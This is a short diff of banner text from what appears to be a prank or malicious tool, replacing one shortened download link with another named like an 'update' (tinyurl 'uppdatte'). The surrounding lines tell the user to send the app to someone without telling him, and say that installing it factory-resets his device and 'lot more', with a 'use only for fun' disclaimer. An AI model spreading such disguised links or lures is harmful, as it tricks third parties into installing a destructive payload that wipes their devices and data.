@@ -143,7 +143,7 @@ say nothing to him. when he install it in his
 device it will be factory reset and lot more happens.
                                 👇👇👇
 
-         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+         \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatte\e[91m
 
                                  👆👆👆
 Use only for fun purpose not for harming someone 😇✌️.
